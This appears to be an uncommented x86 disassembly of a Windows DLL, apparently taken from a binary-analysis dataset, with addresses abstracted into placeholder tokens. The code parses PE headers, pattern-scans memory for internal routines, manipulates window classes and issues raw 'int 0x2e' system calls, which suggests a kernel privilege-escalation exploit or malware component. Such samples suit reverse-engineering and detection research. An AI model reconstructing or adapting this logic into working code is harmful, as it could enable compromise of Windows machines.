mov ecx [ ebp + 0x8 ]
jmp r-xdata
pop edi
pop esi
leave
retn
test ecx ecx
je r-xdata
sub_10009bd3
push ebp
mov ebp esp
sub esp 0x9c
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
push edi
je r-xdata
xor al al
jmp r-xdata
push 0x24
push ebx
push esi
call memset
mov eax rw-data
push eax
mov edi eax
call sub_1000c932
add esp 0x10
cmp eax ebx
mov [ esi + 0x4 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
push ebx
push edi
call [ LoadLibraryExA@IAT ]
cmp eax ebx
mov [ esi ] eax
jne r-xdata
mov eax rw-data
push eax
mov edi eax
call sub_1000c932
cmp eax ebx
pop ecx
mov [ esi + 0x4 ] eax
je r-xdata
lea eax [ ebp - 0x9c ]
mov [ ebp - 0x9c ] 0x9c
push eax
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x98 ]
mov eax [ ebp - 0x94 ]
mov dx [ ebp - 0x8 ]
mov di [ ebp - 0x6 ]
cmp ecx 0x5
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] dx
mov [ esi + 0x12 ] di
jne r-xdata
call [ GetVersion@IAT ]
movzx ecx al
mov [ esi + 0x8 ] ecx
xor ecx ecx
mov cl ah
movzx eax cl
mov [ esi + 0xc ] eax
jmp r-xdata
cmp ecx 0x6
jb r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax 0x4
je r-xdata
push esi
call sub_10009d28
pop ecx
cmp eax 0x2
je r-xdata
cmp dx 0x2
jae r-xdata
mov [ esi + 0x1c ] ebx
dec eax
je r-xdata
mov al 0x1
push rw-data
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ esi + 0x18 ] eax
mov eax [ esi + 0xc ]
cmp eax ebx
je r-xdata
dec eax
jne r-xdata
push rw-data
push esi
call sub_10009b69
pop ecx
mov [ esi + 0x1c ] eax
pop ecx
jmp r-xdata
jbe r-xdata
cmp [ esi + 0x8 ] 0x5
jb r-xdata
jmp r-xdata
mov [ esi + 0x20 ] ebx
cmp eax 0x2
ja r-xdata
push rw-data
push esi
call sub_10009b69
push rw-data
push esi
mov [ esi + 0x1c ] eax
call sub_10009b69
add esp 0x10
mov [ esi + 0x20 ] eax
jmp r-xdata
sub_10009d28
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x70
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor eax eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x50 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0x5a4d
jne r-xdata
xor al al
mov edi [ eax + 0x3c ]
add edi eax
push 0xf8
push edi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
cmp [ edi ] 0x4550
jne r-xdata
mov eax [ edi + 0x2c ]
mov ebx [ edi + 0x34 ]
add ebx eax
mov [ ebp - 0x68 ] ebx
add eax [ esi ]
mov [ ebp - 0x60 ] eax
mov eax [ edi + 0x1c ]
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x24 ] rw-data
mov eax [ esi + 0x8 ]
cmp eax 0x5
jne r-xdata
cmp eax 0x6
jb r-xdata
cmp [ esi + 0xc ] 0x2
jne r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x3c ] eax
test eax eax
je r-xdata
mov [ ebp - 0x24 ] rw-data
cmp [ esi + 0x10 ] 0x1
jae r-xdata
push rw-data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
push 0x1
push 0x1
push [ esi ]
call eax
mov edi eax
push [ ebp - 0x3c ]
call [ FreeLibrary@IAT ]
test edi edi
je r-xdata
push rw-data
push [ esi ]
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
cmp [ esi + 0x8 ] 0x6
push eax
push [ ebp - 0x34 ]
push [ ebp - 0x58 ]
push [ ebp - 0x54 ]
push [ ebp - 0x60 ]
push esi
jae r-xdata
cmp [ edi + 0x10 ] 0x0
je r-xdata
call sub_1000a05b
jmp r-xdata
call sub_10009f62
add eax [ esi ]
push eax
push rw-data
call strcmp
pop ecx
pop ecx
test eax eax
jne r-xdata
add esp 0x18
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
add edi 0x14
jmp r-xdata
mov edi [ edi + 0x10 ]
test edi edi
je r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
add edi [ esi ]
mov [ ebp - 0x6c ] edi
mov [ ebp - 0x70 ] edi
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx eax
shr ecx 0x1f
mov [ ebp - 0x7c ] cl
test cl cl
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
add eax [ esi ]
mov [ ebp - 0x78 ] eax
add eax 0x2
mov [ ebp - 0x74 ] eax
push rw-data
push eax
call strcmp
pop ecx
pop ecx
test eax eax
jne r-xdata
add [ ebp - 0x70 ] 0x4
add edi 0x4
mov [ ebp - 0x6c ] edi
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x50 ] 0x0
je r-xdata
push [ ebp - 0x24 ]
push [ ebp - 0x74 ]
call strcmp
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x2c ] eax
sub eax [ ebp - 0x60 ]
mov [ ebp - 0x20 ] eax
add eax ebx
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x70 ]
mov eax [ eax ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x50 ] eax
sub eax [ ebp - 0x60 ]
mov [ ebp - 0x64 ] eax
add eax ebx
mov [ ebp - 0x34 ] eax
sub_10009f62
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
and [ ebp + 0x1c ] 0x0
push ebx
push esi
push edi
lea edi [ eax - 0x1000 ]
inc edi
inc [ ebp + 0x1c ]
cmp [ ebp + 0x1c ] 0x2000
jl r-xdata
cmp [ edi + 0x1 ] 0x8b
jne r-xdata
cmp [ edi ] 0x55
jne r-xdata
xor al al
cmp [ edi + 0x2 ] 0xec
jne r-xdata
mov ecx edi
xor esi esi
inc ecx
movzx eax [ ecx + 0x4 ]
movzx edx [ ecx + 0x3 ]
shl eax 0x8
add eax edx
mov ebx ecx
movzx edx [ ecx + 0x2 ]
shl eax 0x8
add eax edx
movzx edx [ ecx + 0x1 ]
shl eax 0x8
add ebx eax
lea eax [ edx + ebx + 0x5 ]
mov edx [ ebp + 0xc ]
cmp eax edx
jb r-xdata
cmp [ ecx ] 0xe8
jne r-xdata
inc esi
cmp esi 0x32
jl r-xdata
mov ebx [ ebp + 0x10 ]
add edx ebx
cmp eax edx
ja r-xdata
xor esi esi
inc eax
inc esi
cmp esi 0x32
jl r-xdata
cmp [ eax + 0x1 ] 0x15
jne r-xdata
cmp [ eax ] 0xff
jne r-xdata
jmp r-xdata
mov edx [ eax + 0x2 ]
cmp edx [ ebp + 0x14 ]
je r-xdata
add eax 0x6
xor edx edx
inc eax
inc edx
cmp edx 0x14
jl r-xdata
cmp [ eax + 0x1 ] 0x15
jne r-xdata
cmp [ eax ] 0xff
jne r-xdata
mov ebx [ eax + 0x2 ]
cmp ebx [ ebp + 0x18 ]
jne r-xdata
add ecx 0x5
cmp [ ecx ] 0x85
jne r-xdata
cmp [ ecx + 0x1 ] 0xc0
jne r-xdata
cmp [ ecx + 0x2 ] 0x74
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x4 ]
sub edx [ eax ]
lea ecx [ edx + ecx + 0x2 ]
mov [ eax + 0x14 ] ecx
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000a05b
mov eax [ esp + 0x18 ]
push esi
push edi
xor edi edi
lea edx [ eax - 0x1000 ]
inc edx
inc edi
cmp edi 0x2000
jl r-xdata
cmp [ edx + 0x1 ] 0x8b
jne r-xdata
cmp [ edx ] 0x55
jne r-xdata
xor al al
cmp [ edx + 0x2 ] 0xec
jne r-xdata
lea eax [ edx + 0x3 ]
xor edi edi
inc eax
inc edi
cmp edi 0x32
jl r-xdata
cmp [ eax + 0x1 ] 0x15
jne r-xdata
cmp [ eax ] 0xff
jne r-xdata
jmp r-xdata
mov ecx [ eax + 0x2 ]
cmp ecx [ esp + 0x18 ]
je r-xdata
add eax 0x6
xor esi esi
inc eax
inc esi
cmp esi 0x14
jl r-xdata
cmp [ eax + 0x1 ] 0x15
jne r-xdata
cmp [ eax ] 0xff
jne r-xdata
mov ecx [ eax + 0x2 ]
cmp ecx [ esp + 0x1c ]
jne r-xdata
add eax 0x6
xor ecx ecx
inc eax
inc ecx
cmp ecx 0x28
jl r-xdata
cmp [ eax + 0x1 ] 0xc0
jne r-xdata
cmp [ eax ] 0x85
jne r-xdata
cmp [ eax + 0x2 ] 0x74
je r-xdata
mov ecx [ esp + 0xc ]
mov edx [ ecx + 0x4 ]
sub edx [ ecx ]
lea eax [ edx + eax + 0x2 ]
mov [ ecx + 0x14 ] eax
mov al 0x1
jmp r-xdata
pop edi
pop esi
retn
sub_1000a0fc
push ebp
mov ebp esp
sub esp 0x250
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
push 0x57
cmp [ ebp + 0xc ] edi
je r-xdata
mov ebx [ ebp + 0x10 ]
cmp ebx edi
je r-xdata
mov esi 0x104
lea eax [ ebp - 0x250 ]
push esi
push eax
push rw-data
call [ GetEnvironmentVariableW@IAT ]
lea eax [ ebp - 0x250 ]
push eax
call [ wcslen@IAT ]
sub esi eax
lea eax [ ebp - 0x250 ]
push esi
push rw-data
push eax
call [ wcsncat@IAT ]
add esp 0x10
lea eax [ ebp - 0x250 ]
push edi
push 0x8000000
push 0x3
push edi
push 0x1
push 0x80000000
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
push esi
call sub_1000be67
add esp 0x18
mov ebx eax
push esi
call [ CloseHandle@IAT ]
cmp ebx edi
je r-xdata
push 0xffffffd7
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_10009bd3
mov [ esp ] rw-data
push [ ebp + 0x8 ]
call [ lstrcpyA@IAT ]
push [ ebp + 0x8 ]
push rw-data
push [ ebp + 0xc ]
call [ SetPropA@IAT ]
lea eax [ ebp + 0x10 ]
push 0x7
mov [ ebp + 0x14 ] eax
lea eax [ ebp - 0x44 ]
push eax
push 0x1
push sub_1000a25a
mov [ ebp + 0x10 ] edi
push [ ebp + 0x8 ]
push 0x11
push rw-data
call sub_10009835
add esp 0x1c
mov eax [ ebp - 0x44 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp - 0x3c ]
push 0x0
push [ ebp + 0xc ]
mov edx esp
int 0x2e
add esp 0x14
or [ ebp + 0x8 ] 0xffffffff
mov eax [ ebp - 0x40 ]
push 0x0
push 0x0
mov edx esp
int 0x2e
add esp 0x8
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
push 0xffffffd4
jmp r-xdata
pop eax
pop edi
pop esi
pop ebx
leave
retn
sub_1000a25a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0xc ]
mov [ ecx ] edx
mov ecx [ eax + 0x8 ]
add ecx 0x4
mov edx [ eax + 0x10 ]
mov [ ecx ] edx
and [ ebp - 0x4 ] 0x0
push [ eax + 0x1c ]
push [ eax + 0x18 ]
lea ecx [ eax + 0x20 ]
push ecx
call [ eax + 0x14 ]
add esp 0xc
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a2cd
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x388
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
je r-xdata
push 0x57
cmp [ ebp + 0xc ] ebx
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ edi + 0x200 ]
mov [ ebp - 0x398 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x20 ] bl
mov [ ebp - 0x1f ] bl
push rw-data
call sub_1000c755
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call sub_1000beb7
pop ecx
pop ecx
cmp eax ebx
je r-xdata
push 0xffffffba
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
call sub_10009bd3
pop ecx
test al al
jne r-xdata
push 0xffffffd4
jmp r-xdata
pop eax
or [ ebp - 0x7c ] 0xffffffff
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x13c ] ebx
lea eax [ ebp - 0x13c ]
push eax
lea eax [ ebp - 0x6c ]
push eax
call sub_1000aa69
pop ecx
pop ecx
test al al
jne r-xdata
push 0xffffffc3
jmp r-xdata
push 0xd
lea eax [ ebp - 0x6c ]
push eax
push 0x7
push sub_1000a7de
push edi
push 0x17
push rw-data
call sub_10009835
mov [ ebp - 0x178 ] edi
mov eax edi
shr eax 0x10
mov [ ebp - 0x384 ] eax
mov [ ebp - 0x8c ] 0xa0
mov [ ebp - 0x16c ] 0x30
mov [ ebp - 0x168 ] ebx
mov [ ebp - 0x164 ] ebx
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x15c ] ebx
mov [ ebp - 0x158 ] ebx
mov [ ebp - 0x154 ] ebx
mov [ ebp - 0x150 ] ebx
mov [ ebp - 0x14c ] ebx
mov [ ebp - 0x148 ] ebx
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x140 ] ebx
lea eax [ ebp - 0x16c ]
mov [ ebp - 0x94 ] eax
lea eax [ edi - 0xa0 ]
and eax 0xffff
mov [ ebp - 0x15c ] eax
push rw-data
lea eax [ ebp - 0x380 ]
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x380 ]
push eax
call [ wcslen@IAT ]
add esp 0x28
shl eax 0x1
mov [ ebp - 0x180 ] ax
mov [ ebp - 0x17e ] 0x200
lea eax [ ebp - 0x380 ]
mov [ ebp - 0x17c ] eax
lea eax [ ebp - 0x180 ]
mov [ ebp - 0x174 ] eax
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x390 ] ebx
push 0x8
push ebx
mov esi [ LocalAlloc@IAT ]
call esi
mov [ ebp - 0x90 ] eax
push 0x10
push ebx
call esi
mov esi eax
mov [ ebp - 0x390 ] esi
push 0x8
push ebx
push [ ebp - 0x90 ]
call memset
push 0x10
push ebx
push esi
call memset
push 0x8
push ebx
lea eax [ ebp - 0x38c ]
push eax
call memset
mov eax [ ebp - 0x90 ]
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x84 ] esi
lea eax [ ebp - 0x38c ]
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x138 ] eax
mov esi 0x9c
push esi
push ebx
lea eax [ ebp - 0x134 ]
push eax
call memset
add esp 0x30
mov [ ebp - 0x134 ] esi
lea eax [ ebp - 0x134 ]
push eax
call [ GetVersionExA@IAT ]
mov [ ebp - 0x394 ] rw-data
push 0xa
pop eax
mov [ ebp - 0x98 ] eax
cmp [ ebp - 0xa0 ] 0x1
jb r-xdata
mov [ ebp - 0x7c ] 0xffffffc1
jmp r-xdata
lea ecx [ edi + 0x500 ]
mov [ ebp - 0x170 ] ecx
push 0x8
push 0x1c
push ecx
push eax
push [ ebp - 0x394 ]
call sub_10009898
add esp 0x14
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x0
push 0x80
push 0x25a
push [ ebp - 0x138 ]
push [ ebp - 0x174 ]
push [ ebp - 0x174 ]
push [ ebp - 0x94 ]
mov eax [ ebp - 0x78 ]
call [ ebp - 0x170 ]
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
xor ebx ebx
push ebx
push rw-data
call [ UnregisterClassA@IAT ]
mov eax [ ebp - 0x384 ]
add eax 0xffffff60
and eax 0xffff
mov [ ebp - 0x15c ] eax
push 0x8
push ebx
mov esi [ LocalAlloc@IAT ]
call esi
mov edi eax
mov [ ebp - 0x90 ] edi
push 0x10
push ebx
call esi
mov esi eax
mov [ ebp - 0x390 ] esi
push 0x8
push ebx
push edi
call memset
push 0x10
push ebx
push esi
call memset
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x84 ] esi
push rw-data
lea eax [ ebp - 0x380 ]
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x380 ]
push eax
call [ wcslen@IAT ]
shl eax 0x1
mov [ ebp - 0x180 ] ax
mov [ ebp - 0x17e ] 0x200
push 0x8
push 0x1c
push [ ebp - 0x170 ]
push 0xa
push [ ebp - 0x394 ]
call sub_10009898
add esp 0x38
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x0
push 0x80
push 0x25b
push [ ebp - 0x138 ]
push [ ebp - 0x174 ]
push [ ebp - 0x174 ]
push [ ebp - 0x94 ]
mov eax [ ebp - 0x78 ]
call [ ebp - 0x170 ]
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
push 0x0
push rw-data
call [ UnregisterClassA@IAT ]
push 0x8
push 0x1c
push [ ebp - 0x170 ]
push 0xa
push [ ebp - 0x394 ]
call sub_10009898
push [ ebp - 0x13c ]
call sub_1000c640
add esp 0x18
test al al
jne r-xdata
mov [ ebp - 0x394 ] rw-data
mov [ ebp - 0x98 ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_1000a7ba
mov eax [ ebp - 0x7c ]
jmp r-xdata
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x0
push 0x1
push 0x0
push 0x0
push 0x0
push 0x600
push [ ebp + 0xc ]
mov eax [ ebp - 0x74 ]
call [ ebp - 0x170 ]
mov [ ebp - 0x7c ] eax
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
push 0x0
call sub_1000c640
pop ecx
cmp [ ebp - 0x7c ] 0x0
jne r-xdata
mov [ ebp - 0x7c ] 0xffffffc3
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
xor ebx ebx
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x7c ] 0xffffffc0
push 0x7
lea eax [ ebp - 0x6c ]
push eax
push 0x1
push sub_1000a8d2
push [ ebp - 0x398 ]
push 0x11
push rw-data
call sub_10009835
push 0x8
push 0x4
push [ ebp - 0x170 ]
push 0xa
push [ ebp - 0x394 ]
call sub_10009898
push [ ebp - 0x13c ]
call sub_1000c640
add esp 0x34
test al al
je r-xdata
or [ ebp - 0x7c ] 0xffffffff
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x64
mov eax [ ebp - 0x1c ]
call [ ebp - 0x170 ]
mov [ ebp - 0x7c ] eax
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
push 0x0
call sub_1000c640
pop ecx
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub_1000a7de
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
mov edi [ eax ]
mov [ ebp - 0x28 ] edi
mov eax [ esi + 0x50 ]
lea eax [ edi + eax * 4 ]
mov [ esi + 0x8 ] eax
mov ecx [ eax ]
mov [ esi + 0xc ] ecx
lea ecx [ esi + 0x40 ]
lea edx [ esi + 0x1c ]
push ebx
push 0x4
push ecx
push eax
push edx
call sub_1000c492
add esp 0x14
mov [ ebp - 0x2c ] eax
cmp eax ebx
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x20 ] ecx
mov eax [ esi + 0x4 ]
mov [ ebp - 0x24 ] eax
cmp ecx ebx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ esi + 0x4c ] 0x1
xor eax eax
xor eax ecx
test eax 0xfffff000
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ecx ]
mov [ ebp - 0x30 ] eax
cmp eax edi
je r-xdata
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov ecx [ esi + 0x50 ]
lea eax [ eax + ecx * 4 ]
mov [ esi + 0x14 ] eax
mov ecx [ eax ]
mov [ esi + 0x18 ] ecx
push ebx
push 0x4
lea ecx [ esi + 0x40 ]
push ecx
push eax
lea eax [ esi + 0x1c ]
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x34 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
sub_1000a895
mov esp [ ebp - 0x18 ]
xor ebx ebx
mov esi [ ebp + 0x8 ]
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4c ] 0x1
xor eax eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a8d2
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
cmp esi 0xa
jae r-xdata
and [ ebp - 0x4 ] 0x0
push esi
call sub_1000a949
push esi
call sub_1000a9e7
push [ esi + 0x48 ]
push [ esi + 0x44 ]
lea eax [ esi + 0x1c ]
push eax
call [ esi ]
add esp 0x14
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax 0xc0000061
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a949
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
lea edi [ esi + 0x1c ]
push ebx
push 0x4
lea eax [ esi + 0xc ]
push eax
push [ esi + 0x8 ]
push edi
call sub_1000c492
add esp 0x14
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
cmp [ esi + 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ esi + 0x4d ] 0x1
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx ebx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi + 0x18 ]
cmp [ eax ] ebx
je r-xdata
push ebx
push 0x4
push eax
push ecx
push edi
call sub_1000c492
add esp 0x14
mov [ ebp - 0x20 ] eax
sub_1000a9e7
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x20 ] ecx
test ecx ecx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
mov [ ebp - 0x24 ] 0xeb
push 0x0
push 0x1
lea edx [ ebp - 0x24 ]
push edx
push ecx
add eax 0x1c
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
sub_1000aa69
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
xor al al
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea ebx [ edi + 0x1c ]
push rw-data
push ebx
call sub_10009b69
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
push rw-data
push ebx
call sub_10009b69
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ edi + 0x4 ] esi
and [ edi + 0x10 ] 0x0
sub esi [ edi + 0x20 ]
mov [ ebp - 0x24 ] esi
push rw-data
push [ ebx ]
call [ GetProcAddress@IAT ]
mov edx eax
mov [ ebp - 0x28 ] edx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov ebx 0xffbfffff
mov eax [ edi + 0x20 ]
add eax [ ebp - 0x34 ]
mov [ edi + 0x10 ] eax
jmp r-xdata
lea ecx [ eax + edx ]
mov [ ebp - 0x3c ] ecx
mov ecx [ ecx ]
and ecx ebx
mov [ ebp - 0x38 ] ecx
cmp ecx [ ebp - 0x24 ]
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al 0x1
jmp r-xdata
inc eax
mov [ ebp - 0x30 ] eax
jmp r-xdata
lea edx [ eax + edx + 0x9 ]
mov [ ebp - 0x3c ] edx
mov edx [ edx ]
and edx ebx
mov [ ebp - 0x40 ] edx
mov esi edx
xor esi ecx
test esi 0xfffff000
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x64
jge r-xdata
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x34 ] edx
sub_1000ab6f
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38c
push ebx
push esi
push edi
xor ebx ebx
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
push 0x57
cmp [ ebp + 0xc ] ebx
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ esi + 0x200 ]
mov [ ebp - 0x398 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x20 ] bl
mov [ ebp - 0x1f ] bl
push rw-data
call sub_1000c755
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call sub_1000beb7
pop ecx
pop ecx
cmp eax ebx
je r-xdata
push 0xffffffba
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
call sub_10009bd3
pop ecx
test al al
jne r-xdata
push 0xffffffd4
jmp r-xdata
pop eax
or [ ebp - 0x7c ] 0xffffffff
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x13c ] ebx
lea eax [ ebp - 0x13c ]
push eax
lea eax [ ebp - 0x6c ]
push eax
call sub_1000b369
pop ecx
pop ecx
test al al
jne r-xdata
push 0xffffffc3
jmp r-xdata
push 0xd
lea eax [ ebp - 0x6c ]
push eax
push 0x7
push sub_1000b0de
push esi
push 0x17
push rw-data
call sub_10009835
mov [ ebp - 0x178 ] esi
mov eax esi
shr eax 0x10
mov [ ebp - 0x384 ] eax
mov edi 0x9c
push edi
push ebx
lea eax [ ebp - 0x134 ]
push eax
call memset
add esp 0x28
